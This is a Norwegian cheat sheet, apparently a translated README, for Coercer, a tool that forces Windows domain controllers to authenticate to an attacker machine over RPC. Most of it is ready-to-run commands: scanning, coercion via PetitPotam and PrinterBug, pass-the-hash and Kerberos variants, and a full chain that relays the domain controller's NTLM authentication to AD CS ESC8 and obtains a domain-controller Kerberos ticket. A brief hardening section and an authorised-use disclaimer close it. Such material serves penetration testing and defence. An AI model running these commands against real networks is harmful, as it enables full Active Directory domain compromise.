<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Skann, oppdage og tving Windows-servere og domenekontrollere automatisk til å autentisere tilbake til vilkårlige maskiner via 12+ RPC-protokoller</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt & The Authentication Coercion Primitive](#-overview--the-autentication-coercion-primitive)
- [Støttede RPC-protokoller og -metoder](#-støttede-rpc-protokoller--metoder)
- [Installasjon](#-installasjon)
- [Skanning etter sårbare RPC-grensesnitt (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Utfører autentiseringstvang (`coerce`)](#-executing-authentication-coercion-coerce)
- [The Full Attack Chain: Coercion -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Protokoll- og metodefiltrering](#-protokoll--metodefiltrering)
- [Kerberos & Pass-the-Hash Support](#-kerberos--pass-the-hash-support)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt & The Authentication Coercion Primitive

I Active Directory-miljøer er **autentiseringstvang** en ødeleggende støtende primitiv. Den utnytter eldre RPC-grensesnitt implementert i Windows-tjenester som lar en autentisert bruker be en ekstern maskin (som en domenekontroller) om å koble til en angitt UNC-bane (`\\attacker\share`).

Når den eksterne Windows-maskinen kobler til den angriperkontrollerte maskinen, starter den **maskinkonto NTLM-autentisering** (`DC01$`). 

Ved å fange opp eller videresende denne maskinkontolegitimasjonen ved hjelp av `ntlmrelayx` til Active Directory Certificate Services (AD CS Web Enrollment - ESC8) eller ubegrensede delegeringsmål, kan angripere oppnå **umiddelbar fullstendig domenekompromittering**.

Forfattet av **Clément Notin (p0dalirius)**, **Coercer** forener over et dusin individuelle tvangsutnyttelser (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) til et enkelt, automatisert, svært modulært rammeverk.

---

## 🔌 Støttede RPC-protokoller og -metoder

Coercer tester og utnytter følgende RPC-grensesnitt:

| Protokollnavn | Vanlig utnyttelsesnavn | Rør / grensesnitt |
|--------------|---------------------|----------------|
| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug / SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
| **MS-PAN** | PrintNightmare ved siden av | Ekstern utskriftsadministrasjon |
| **MS-SAMR** | Oste | Sikkerhetskontoadministrator |

---

## 📥 Installasjon
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Skanning etter sårbare RPC-grensesnitt (`scan`)

Før du utløser tvang, skann trygt måldomenekontrollere for å finne ut hvilke RPC-funksjoner som er aktivert og tilgjengelig:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Utføre autentiseringstvang (`coerce`)

Utløs en utgående maskinkonto-NTLM-tilkobling fra mål-DC til lytteren din:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 Hele angrepskjeden: tvang -> NTLM-relé -> AD CS ESC8

Den kanoniske domeneeskaleringsvektoren:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Protokoll- og metodefiltrering

Målrett en spesifikk metode uten å spamme hele RPC-spekteret:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Kerberos og Pass-the-Hash-støtte
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Skann DC for tvang** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Tvangsgodkjenning** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Tvang via MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Tvang via MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Pass-the-Hash-tvang** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Kerberos Ticket Coerce** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Defensive betraktninger og herding

1. **Deaktiver Print Spooler på DC-er:** Print Spooler-tjenesten (`spoolsv.exe`) skal være fullstendig deaktivert på domenekontrollere (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Aktiver utvidet beskyttelse for autentisering (EPA):** På AD CS IIS-servere, aktiver EPA og krev HTTPS for å blokkere NTLM Relay-angrep.
3. **RPC-filtrering og nettverkssegmentering:** Begrens RPC-endepunktskartleggingstilgang (TCP-port 135) til autoriserte administrative undernett.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Coercer utløser aktive fjerngodkjenningsanrop som kan destabilisere ikke-patchede domenetjenester. Bruk kun under autoriserte penetrasjonstester og med eksplisitt kundesamtykke.